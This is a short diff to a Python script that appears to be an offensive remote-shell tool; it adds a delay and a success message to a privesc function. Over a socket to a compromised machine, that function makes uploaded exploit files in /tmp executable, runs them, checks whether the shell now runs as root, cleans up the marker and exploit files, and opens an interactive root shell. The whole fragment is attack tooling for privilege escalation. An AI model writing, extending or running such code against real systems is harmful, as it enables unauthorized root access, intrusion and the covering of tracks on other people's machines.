@@ -7,6 +7,7 @@ import socket
 import struct
 import random
 import base64
+from time import sleep
 
 def main(port, interface):
     persistent = False
@@ -48,8 +49,9 @@ def privesc(sock, shell):
                 sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
                 sock.send('./exploit{0}{1}\n'.format(counter, ext))
             sock.send("""/bin/sh -c '[ "$(id)" = "uid=0(root) gid=0(root) groups=0(root)" ] && touch /tmp/valid_root'\n""")
-            rsh.file_exists('/tmp/valid_root')
+            sleep(2)
             if rsh.file_exists('/tmp/valid_root') == True:
+                print('[+] Privesc exploit worked !')
                 sock.send('rm /tmp/valid_root\n')
                 sock.send('rm /tmp/exploit{0}{1}\n'.format(counter, ext))
                 shell.interact()
